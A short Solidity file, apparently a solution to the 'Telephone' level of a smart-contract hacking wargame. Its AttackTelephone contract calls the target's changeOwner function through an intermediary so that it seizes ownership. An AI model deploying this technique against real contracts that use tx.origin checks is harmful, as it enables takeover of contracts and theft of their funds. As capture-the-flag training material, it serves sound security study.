// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackTelephone {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        (bool success, ) = target.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
        require(success, "Call to Telephone contract failed");

    }
}
